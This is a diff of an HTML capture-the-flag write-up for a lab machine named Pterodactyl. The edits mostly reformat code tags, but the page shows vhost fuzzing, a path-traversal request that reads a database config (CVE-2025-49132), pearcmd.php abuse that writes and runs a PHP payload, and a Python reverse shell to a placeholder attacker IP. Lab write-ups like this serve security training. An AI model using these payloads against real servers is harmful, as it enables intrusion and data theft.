@@ -38,7 +38,7 @@
 </head>
 
 <body class="challenge-body">
-    <header class="challenge-hero" style="position: relative;">
+  <header class="challenge-hero" style="position: relative;">
     <div style="position: absolute; top: 1.5rem; right: 2rem; z-index: 10;">
       <button aria-label="Switch to light mode" class="theme-toggle" data-theme-toggle="" type="button">
         <span class="theme-track">
@@ -147,7 +147,8 @@ PORT     STATE  SERVICE    VERSION
       </header>
       <p>We enumerate virtual hosts (vhosts) to identify additional exposed services.</p>
       <p>
-        <code class="language-bash">ffuf -w /snap/seclists/current/Discovery/DNS/combined_subdomains.txt -u http://pterodactyl.htb -H "Host: FUZZ.pterodactyl.htb" -fs 145</code>
+        <code
+          class="language-bash">ffuf -w /snap/seclists/current/Discovery/DNS/combined_subdomains.txt -u http://pterodactyl.htb -H "Host: FUZZ.pterodactyl.htb" -fs 145</code>
       <pre class="terminal">
               <code>
 
@@ -196,7 +197,8 @@ panel                   [Status: 200, Size: 1897, Words: 490, Lines: 36]
         <code>/var/www/pterodactyl/config/database.php</code>
       </p>
       <p>
-        <code class="language-bash">curl "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../pterodactyl/config&namespace=database" | jq</code>
+        <code
+          class="language-bash">curl "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../pterodactyl/config&namespace=database" | jq</code>
       <p>Extracted database connection details:</p>
       <pre class="terminal">
             <code>
@@ -271,7 +273,8 @@ panel                   [Status: 200, Size: 1897, Words: 490, Lines: 36]
       <p>Using the <code>CVE-2025-49132</code> vulnerability, we verify that the <code>pearcmd.php</code> file is
         accessible on the server.</p>
       <p>
-        <code class="language-bash">curl "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd"</code>
+        <code
+          class="language-bash">curl "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd"</code>
       <pre class="terminal">
               <code>
 &lt;&excl;DOCTYPE html&gt;&NewLine;&lt;html lang&equals;&quot;en&quot;&gt;&NewLine;    &lt;head&gt;&NewLine;        &lt;meta charset&equals;&quot;utf-8&quot;&gt;&NewLine;        &lt;meta name&equals;&quot;viewport&quot; content&equals;&quot;width&equals;device-width&comma; initial-scale&equals;1&quot;&gt;&NewLine;&NewLine;&period;&period;&period; &NewLine;&NewLine;&NewLine;    &lt;&sol;body&gt;&NewLine;&lt;&sol;html&gt;</code>
@@ -284,11 +287,13 @@ panel                   [Status: 200, Size: 1897, Words: 490, Lines: 36]
       <p>To test the vulnerability, we use <code>pearcmd.php</code> to create a PHP script
         (<code>/tmp/payload.php</code>) that executes the <code>id</code> command on the target system.</p>
       <p>
-        <code class="language-bash">curl &quot;http&colon;&sol;&sol;panel&period;pterodactyl&period;htb&sol;locales&sol;locale&period;json&quest;&plus;config-create&plus;&sol;&amp;locale&equals;&period;&period;&sol;&period;&period;&sol;&period;&period;&sol;&period;&period;&sol;&period;&period;&sol;&period;&period;&sol;usr&sol;share&sol;php&sol;PEAR&amp;namespace&equals;pearcmd&amp;&sol;&lt;&quest;&equals;system&lpar;base64&lowbar;decode&lpar;&apos;aWQ&equals;&apos;&rpar;&rpar;&quest;&gt;&plus;&sol;tmp&sol;payload&period;php&quot;</code>
+        <code
+          class="language-bash">curl &quot;http&colon;&sol;&sol;panel&period;pterodactyl&period;htb&sol;locales&sol;locale&period;json&quest;&plus;config-create&plus;&sol;&amp;locale&equals;&period;&period;&sol;&period;&period;&sol;&period;&period;&sol;&period;&period;&sol;&period;&period;&sol;&period;&period;&sol;usr&sol;share&sol;php&sol;PEAR&amp;namespace&equals;pearcmd&amp;&sol;&lt;&quest;&equals;system&lpar;base64&lowbar;decode&lpar;&apos;aWQ&equals;&apos;&rpar;&rpar;&quest;&gt;&plus;&sol;tmp&sol;payload&period;php&quot;</code>
       </p>
       <p>We execute the previously created PHP file using the same vulnerability:</p>
       <p>
-        <code class="language-bash">curl &quot;http&colon;&sol;&sol;panel&period;pterodactyl&period;htb&sol;locales&sol;locale&period;json&quest;locale&equals;&period;&period;&sol;&period;&period;&sol;&period;&period;&sol;&period;&period;&sol;&period;&period;&sol;&period;&period;&sol;tmp&amp;namespace&equals;payload&quot;</code>
+        <code
+          class="language-bash">curl &quot;http&colon;&sol;&sol;panel&period;pterodactyl&period;htb&sol;locales&sol;locale&period;json&quest;locale&equals;&period;&period;&sol;&period;&period;&sol;&period;&period;&sol;&period;&period;&sol;&period;&period;&sol;&period;&period;&sol;tmp&amp;namespace&equals;payload&quot;</code>
       </p>
       <p>The output confirms successful execution of the <code>id</code> command:</p>
       <pre class="terminal">
@@ -301,7 +306,8 @@ panel                   [Status: 200, Size: 1897, Words: 490, Lines: 36]
       </header>
       <p>Python 3.6.15 is installed on the machine, so we use the following payload to obtain a reverse shell.</p>
       <p>
-        <code class="language-python">python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;ATTACKER-IP&gt;",&lt;ATTACKER-PORT&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'</code>
+        <code
+          class="language-python">python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;ATTACKER-IP&gt;",&lt;ATTACKER-PORT&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'</code>
       </p>
       <p>After writing and triggering the payload, we obtain a reverse shell as the user <code>wwwrun</code></p>
 
@@ -431,7 +437,7 @@ uid=0(root) gid=0(root) groups=0(root),100(users)</code>
     </section>
 
     <section aria-labelledby="overview-title" class="card section-overview" id="references">
-      <img src="./assets/machine_solved.png" width="100%"/>
+      <img src="./assets/machine_solved.png" width="100%" />
     </section>
 
   </main>
@@ -446,7 +452,7 @@ uid=0(root) gid=0(root) groups=0(root),100(users)</code>
       currentYearEl.textContent = new Date().getFullYear();
     }
 
-    
+
     const themeBtn = document.querySelector('[data-theme-toggle]');
     if (themeBtn) {
       const THEME_STORAGE_KEY = 'portfolio-theme';
@@ -487,6 +493,7 @@ uid=0(root) gid=0(root) groups=0(root),100(users)</code>
       });
     });
   </script>
+  <script src="../writeups_toc.js"></script>
 </body>
 
 </html>
